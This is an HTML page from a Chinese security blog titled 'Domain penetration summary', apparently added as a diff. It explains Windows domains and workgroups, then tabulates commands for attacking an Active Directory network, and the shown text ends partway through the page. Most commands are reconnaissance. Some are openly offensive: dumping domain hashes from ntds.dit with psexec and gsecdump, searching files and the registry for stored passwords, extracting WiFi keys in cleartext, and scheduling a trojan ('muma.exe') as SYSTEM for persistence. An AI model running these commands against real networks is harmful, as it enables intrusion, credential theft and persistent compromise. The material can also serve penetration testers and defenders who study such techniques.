@@ -1,0 +1,1886 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="收集整理的相关域渗透的命令和思路 内网和域内网局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。 域域（Domain）是相对工作组（Work">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透总结">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/19/2018-12-19-域渗透/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="收集整理的相关域渗透的命令和思路 内网和域内网局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。 域域（Domain）是相对工作组（Work">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png">
+<meta property="og:image" content="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg">
+<meta property="og:image" content="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png">
+<meta property="og:image" content="http://b404.xyz/img/hack/%E5%86%85%E7%BD%91/net_use_for.png">
+<meta property="og:image" content="http://b404.xyz/img/hack/%E5%86%85%E7%BD%91/nbtscan.png">
+<meta property="og:image" content="http://b404.xyz/img/hack/%E5%86%85%E7%BD%91/IE_Auto_detect_settings.png">
+<meta property="og:image" content="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1">
+<meta property="og:image" content="http://b404.xyz/img/tools/domain/hash/wce.png">
+<meta property="og:image" content="http://b404.xyz/img/tools/domain/hash/mimikatz.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.409Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域渗透总结">
+<meta name="twitter:description" content="收集整理的相关域渗透的命令和思路 内网和域内网局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。 域域（Domain）是相对工作组（Work">
+<meta name="twitter:image" content="http://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/19/2018-12-19-域渗透/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>域渗透总结 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/19/2018-12-19-域渗透/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">域渗透总结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-19 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-19T00:00:00+08:00">2018-12-19</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">18k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">16 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>收集整理的相关域渗透的命令和思路</p>
+<h1 id="内网和域"><a href="#内网和域" class="headerlink" title="内网和域"></a>内网和域</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
+<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
+<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
+<p>域控制器可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
+<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
+<ul>
+<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 – 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 – 域：域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
+</ul>
+<blockquote>
+<p>域和域之间可以通过VPN等设备进行连接，并建立从属和平行的域关系</p>
+</blockquote>
+<h2 id="域、工作组、家庭组"><a href="#域、工作组、家庭组" class="headerlink" title="域、工作组、家庭组"></a>域、工作组、家庭组</h2><p><strong>工作组:</strong></p>
+<ul>
+<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
+<li>通常情况下，计算机的数量不超过二十台。</li>
+<li>工作组不受密码保护。</li>
+<li>所有的计算机必须在同一本地网络或子网中。</li>
+</ul>
+<p><strong>家庭组：</strong></p>
+<ul>
+<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
+<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
+</ul>
+<p><strong>域：</strong></p>
+<ul>
+<li>有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。</li>
+<li>如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。 由于网络管理员经常要确保计算机之间的一致性，所以，您也许只能对计算机的设置进行有限制地更改。</li>
+<li>一个域中可以有几千台计算机。</li>
+<li>计算机可以位于不同的本地网络中。</li>
+</ul>
+<hr>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><p>若直线攻击难以奏效，可以进行迂回进攻，从网络为突破，以受限用户权限开始，分析网络结构，制定对应的攻击方案，获取目标的域管理账户，逐步掌控整个网络。</p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>参见:<a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">内网渗透命令大全</a>:<a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-39285.html</a></p>
+<h3 id="Net基本命令"><a href="#Net基本命令" class="headerlink" title="Net基本命令"></a>Net基本命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo %PROCESSOR_ARCHITECTURE%</code></td>
+<td>查看系统版本位数</td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td>查看系统环境变量</td>
+</tr>
+<tr>
+<td><code>netstat -ano</code></td>
+<td>查看开放的端口</td>
+</tr>
+<tr>
+<td>`netstat -an</td>
+<td>find &quot;3389&quot;`</td>
+</tr>
+<tr>
+<td><code>ipconfig /all</code></td>
+<td>查询本机IP段，所在域等</td>
+</tr>
+<tr>
+<td><code>net config Workstation</code></td>
+<td>当前计算机名，全名，用户名，系统版本，工作站域，登陆域</td>
+</tr>
+<tr>
+<td><code>net user</code></td>
+<td>本机用户列表</td>
+</tr>
+<tr>
+<td><code>net localhroup administrators</code></td>
+<td>本机管理员[通常含有域用户]</td>
+</tr>
+<tr>
+<td><code>net user /domain</code></td>
+<td>查询域用户</td>
+</tr>
+<tr>
+<td><code>net user 用户名 /domain</code></td>
+<td>获取指定用户的账户信息</td>
+</tr>
+<tr>
+<td><code>net user /domain b404 pass</code></td>
+<td>修改域内用户密码，需要管理员权限</td>
+</tr>
+<tr>
+<td><code>net group /domain</code></td>
+<td>查询域里面的工作组</td>
+</tr>
+<tr>
+<td><code>net group 组名 /domain</code></td>
+<td>查询域中的某工作组</td>
+</tr>
+<tr>
+<td><code>net group &quot;domain admins&quot; /domain</code></td>
+<td>查询域管理员列表</td>
+</tr>
+<tr>
+<td><code>net group &quot;enterprise admins&quot; /domain</code></td>
+<td>获得企业管理员列表</td>
+</tr>
+<tr>
+<td><code>net group 组名 /del /domain</code></td>
+<td>删除域中的某组</td>
+</tr>
+<tr>
+<td><code>net group 组名 组成员名 /del /domain</code></td>
+<td>删除域中的某组的组成员</td>
+</tr>
+<tr>
+<td><code>net localgroup administrators /domain</code></td>
+<td>登录本机的域管理员</td>
+</tr>
+<tr>
+<td><code>net group 组名 /add</code></td>
+<td>增加域中的组</td>
+</tr>
+<tr>
+<td><code>net localgroup administrators workgroup\user001 /add</code></td>
+<td>域用户添加到本机</td>
+</tr>
+<tr>
+<td><code>net group &quot;domain controllers&quot; /domain</code></td>
+<td>查看域控制器(如果有多台)</td>
+</tr>
+<tr>
+<td><code>net time /domain</code></td>
+<td>判断主域，主域服务器都做时间服务器</td>
+</tr>
+<tr>
+<td><code>net config workstation</code></td>
+<td>当前登录域</td>
+</tr>
+<tr>
+<td><code>net session</code></td>
+<td>查看当前会话</td>
+</tr>
+<tr>
+<td><code>net use \\ip\ipc$ pawword /user:username@domain</code></td>
+<td>建立IPC会话[空连接-***]</td>
+</tr>
+<tr>
+<td><code>net view \\ip</code></td>
+<td>查询某IP共享</td>
+</tr>
+<tr>
+<td><code>net use z: \\192.168.200.21\文件夹名</code></td>
+<td>建立映射到本机Z盘</td>
+</tr>
+<tr>
+<td><code>net share</code></td>
+<td>查看SMB指向的路径[即共享]</td>
+</tr>
+<tr>
+<td><code>at \\192.168.200.21:50 c:\windows\fuxk.exe</code></td>
+<td>在共享主机上执行</td>
+</tr>
+<tr>
+<td><code>net view</code></td>
+<td>查询同一域内机器列表</td>
+</tr>
+<tr>
+<td><code>net view /domain</code></td>
+<td>查询域列表</td>
+</tr>
+<tr>
+<td><code>net view /domain:test</code></td>
+<td>查看test域中计算机列表</td>
+</tr>
+<tr>
+<td><code>net view \\DC的机器名字</code></td>
+<td>查看域控共享情况</td>
+</tr>
+<tr>
+<td><code>nltest /domain_trusts</code></td>
+<td>获取域信任信息</td>
+</tr>
+<tr>
+<td><code>net session</code></td>
+<td>查看当前会话</td>
+</tr>
+<tr>
+<td><code>net start</code></td>
+<td>查看当前运行的服务</td>
+</tr>
+<tr>
+<td><code>net time /domain</code></td>
+<td>查询主域服务器的时间</td>
+</tr>
+<tr>
+<td><code>net time \\192.168.200.21</code></td>
+<td>查看192.168.200.21机器的时间</td>
+</tr>
+<tr>
+<td><code>echo %logonserver%</code></td>
+<td>查看登陆到这台服务器的计算机</td>
+</tr>
+<tr>
+<td><code>net accounts</code></td>
+<td>查看本地密码策略</td>
+</tr>
+<tr>
+<td><code>net accounts /domain</code></td>
+<td>查看域密码策略</td>
+</tr>
+<tr>
+<td><code>nbtstat –A ip</code></td>
+<td>netbios 查询</td>
+</tr>
+<tr>
+<td><code>netstat –an/ano/anb</code></td>
+<td>网络连接查询</td>
+</tr>
+<tr>
+<td><code>netsh firewall show config</code></td>
+<td>查看防火墙策略</td>
+</tr>
+<tr>
+<td><code>netsh firewall show state</code></td>
+<td>查看防火墙策略</td>
+</tr>
+<tr>
+<td><code>route print</code></td>
+<td>路由表</td>
+</tr>
+<tr>
+<td><code>tracert IP</code></td>
+<td>路由跟踪</td>
+</tr>
+<tr>
+<td><code>arp -a</code></td>
+<td>列出本网段内所有活跃的IP地址</td>
+</tr>
+<tr>
+<td><code>arp -s (ip + mac)</code></td>
+<td>绑定mac和IP</td>
+</tr>
+<tr>
+<td><code>arp -d (iP + mac)</code></td>
+<td>解绑IP和Mac</td>
+</tr>
+<tr>
+<td><code>tasklist /V</code></td>
+<td>查看进程[显示对应用户]</td>
+</tr>
+<tr>
+<td><code>tasklist /S ip /U domain\username /P /V</code></td>
+<td>查看远程计算机进程列表</td>
+</tr>
+<tr>
+<td><code>psexec \\192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u</code></td>
+<td>从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td>
+</tr>
+<tr>
+<td><code>gsecdump -a</code></td>
+<td>获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td>
+</tr>
+<tr>
+<td><code>tasklist /S IP地址 /U 域名\用户名 /P /V</code></td>
+<td>查看远程计算机进程</td>
+</tr>
+<tr>
+<td><code>tasklist /svc</code></td>
+<td>查看进程</td>
+</tr>
+<tr>
+<td><code>taskkill /im 进程名称(cmd.exe)</code></td>
+<td>结束进程</td>
+</tr>
+<tr>
+<td><code>taskkill /pid[进程码]</code></td>
+<td><code>-t(结束该进程)</code> <code>-f(强制结束该进程以及所有子进程)</code></td>
+</tr>
+<tr>
+<td><code>ping 主机名</code></td>
+<td>显示IP</td>
+</tr>
+<tr>
+<td><code>qprocess *</code></td>
+<td>类似tasklist</td>
+</tr>
+<tr>
+<td><code>qprocess /SERVER:IP</code></td>
+<td>远程查看计算机进程列表</td>
+</tr>
+<tr>
+<td><code>nslookup –qt-MX Yahoo.com</code></td>
+<td>查看邮件服务器</td>
+</tr>
+<tr>
+<td><code>whoami /all</code></td>
+<td>查询当前用户权限等</td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td>查看系统环境变量</td>
+</tr>
+<tr>
+<td><code>systeminfo</code></td>
+<td>查看系统信息</td>
+</tr>
+<tr>
+<td><code>qwinsta</code></td>
+<td>查看登录情况</td>
+</tr>
+<tr>
+<td><code>qwinsta /SERVER:IP</code></td>
+<td>查看远程登录情况</td>
+</tr>
+<tr>
+<td><code>fsutil fsinfo drives</code></td>
+<td>查看所有盘符</td>
+</tr>
+<tr>
+<td><code>gpupdate /force</code></td>
+<td>更新域策略</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>查询账号所属权限</td>
+</tr>
+<tr>
+<td><code>whoami /all</code></td>
+<td>查看sid号</td>
+</tr>
+<tr>
+<td><code>wmic bios</code></td>
+<td>查看bios信息</td>
+</tr>
+<tr>
+<td><code>wmic qfe</code></td>
+<td>查看补丁信息</td>
+</tr>
+<tr>
+<td><code>wmic qfe get hotfixid</code></td>
+<td>查看补丁-Patch号，很实用</td>
+</tr>
+<tr>
+<td><code>wmic qfe list full /format:htable &gt; hotfixes.htm</code></td>
+<td>详细的补丁安装</td>
+</tr>
+<tr>
+<td><code>wmic share get name,path</code></td>
+<td>查看SMB指向路径</td>
+</tr>
+<tr>
+<td><code>wmic startup</code></td>
+<td>查看启动项</td>
+</tr>
+<tr>
+<td><code>wmic service</code></td>
+<td>查看服务</td>
+</tr>
+<tr>
+<td><code>wmic os</code></td>
+<td>查看OS信息</td>
+</tr>
+<tr>
+<td><code>wmic service list brief</code></td>
+<td>查看进程服务</td>
+</tr>
+<tr>
+<td><code>wmic process list brief</code></td>
+<td>查看进程</td>
+</tr>
+<tr>
+<td><code>wmic startup list brief</code></td>
+<td>启动程序信息</td>
+</tr>
+<tr>
+<td><code>wmic product list brief</code></td>
+<td>查看安装程序和版本信息（漏洞利用线索）</td>
+</tr>
+<tr>
+<td><code>wmic startup list full</code></td>
+<td>识别开机启动的程序</td>
+</tr>
+<tr>
+<td><code>wmic process where(description=&quot;mysqld.exe&quot;)&gt;&gt;mysql.log</code></td>
+<td>获取软件安装路径</td>
+</tr>
+<tr>
+<td><code>dir \\DC\SYSVOL /s /a &gt; sysvol.txt</code></td>
+<td>列出sysvol日志记录</td>
+</tr>
+<tr>
+<td><code>xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt /i /e /c</code></td>
+<td>拷贝sysvol.txt到本地</td>
+</tr>
+<tr>
+<td><code>REG query HKCU /v &quot;pwd&quot; /s</code></td>
+<td>获取到存到注册表中的密码</td>
+</tr>
+<tr>
+<td><code>dir /b/s config.*</code></td>
+<td>查看所在目录所有前缀为config的文件</td>
+</tr>
+<tr>
+<td><code>findstr /si password *.xml *.ini *.txt</code></td>
+<td>查看后缀名文件中含有password关键字的文件</td>
+</tr>
+<tr>
+<td><code>findstr /si login *.xml *.ini *.txt</code></td>
+<td>查看后缀名文件中含有login关键字的文件</td>
+</tr>
+<tr>
+<td><code>copy con ftp.bat</code></td>
+<td>创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td>
+</tr>
+<tr>
+<td><code>copy con test.vbs</code></td>
+<td>创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td>
+</tr>
+</tbody></table>
+<h3 id="dsquery的AD查询工具"><a href="#dsquery的AD查询工具" class="headerlink" title="dsquery的AD查询工具"></a>dsquery的AD查询工具</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</code></td>
+<td>列出该域内所有用户名</td>
+</tr>
+<tr>
+<td>`dsquery server -domain super.com</td>
+<td>dsget server -dnsname -site`</td>
+</tr>
+<tr>
+<td><code>dsquery contact</code></td>
+<td>寻找目录中的联系人</td>
+</tr>
+<tr>
+<td><code>dsquery subnet</code></td>
+<td>列出该域内网段划分</td>
+</tr>
+<tr>
+<td><code>query user</code></td>
+<td>查询那些用户在线</td>
+</tr>
+<tr>
+<td><code>dsquery group &amp;&amp; net group /domain</code></td>
+<td>列出该域内分组</td>
+</tr>
+<tr>
+<td><code>dsquery ou</code></td>
+<td>列出该域内组织单位</td>
+</tr>
+<tr>
+<td><code>dsquery server &amp;&amp; net time /domain</code></td>
+<td>列出该域内域控制器</td>
+</tr>
+<tr>
+<td><code>dsquery site -o rdn</code></td>
+<td>搜索域中所有站点的名称</td>
+</tr>
+<tr>
+<td>`dsquery group dc=super,dc=com</td>
+<td>more`</td>
+</tr>
+<tr>
+<td><code>psloggedon.exe</code></td>
+<td>查询那台主机和用户登录到该主机上</td>
+</tr>
+<tr>
+<td><code>netsess.exe //192.168.1.115</code></td>
+<td>远程主机上无需管理员权限,查询到主机名和用户</td>
+</tr>
+<tr>
+<td><code>reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT&quot;</code></td>
+<td>获取最近mstsc登录的记录</td>
+</tr>
+</tbody></table>
+<h3 id="DOS常用命令"><a href="#DOS常用命令" class="headerlink" title="DOS常用命令"></a>DOS常用命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mspaint</td>
+<td>画图工具</td>
+</tr>
+<tr>
+<td>calc</td>
+<td>计算器</td>
+</tr>
+<tr>
+<td>notepad</td>
+<td>记事本</td>
+</tr>
+<tr>
+<td>taskmgr</td>
+<td>任务管理器</td>
+</tr>
+<tr>
+<td>osk</td>
+<td>打开屏幕键盘</td>
+</tr>
+<tr>
+<td>gpedit.msc</td>
+<td>组策略</td>
+</tr>
+<tr>
+<td>services.msc</td>
+<td>本地服务</td>
+</tr>
+<tr>
+<td>compmgmt.msc</td>
+<td>计算机管理</td>
+</tr>
+<tr>
+<td>devmgmt.msc</td>
+<td>设备管理器</td>
+</tr>
+<tr>
+<td>winver</td>
+<td>查看系统版本</td>
+</tr>
+<tr>
+<td>magnify</td>
+<td>放大镜实用程序</td>
+</tr>
+<tr>
+<td>eventvwr</td>
+<td>事件查看器</td>
+</tr>
+<tr>
+<td>Regedit</td>
+<td>打开注册表</td>
+</tr>
+<tr>
+<td>resmon</td>
+<td>资源监视器</td>
+</tr>
+<tr>
+<td>WMIC BIOS get releasedate</td>
+<td>查看电脑生产日期</td>
+</tr>
+<tr>
+<td>mstsc -f</td>
+<td>远程连接（可以全屏）</td>
+</tr>
+</tbody></table>
+<h3 id="长命令"><a href="#长命令" class="headerlink" title="长命令"></a>长命令</h3><p>一键获取WiFI密码：**</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan showprofiles&apos;) do @echo%j | findstr -i -v echo | netsh wlan show profiles %jkey=clear</span><br></pre></td></tr></table></figure>
+
+<p>查看是否支持PowerShell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if defined PSModulePath (echo support powershell) else (echo not support powershell)</span><br></pre></td></tr></table></figure>
+
+<p>添加任务计划：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks.exe  /Create /RU&quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/12/31</span><br></pre></td></tr></table></figure>
+
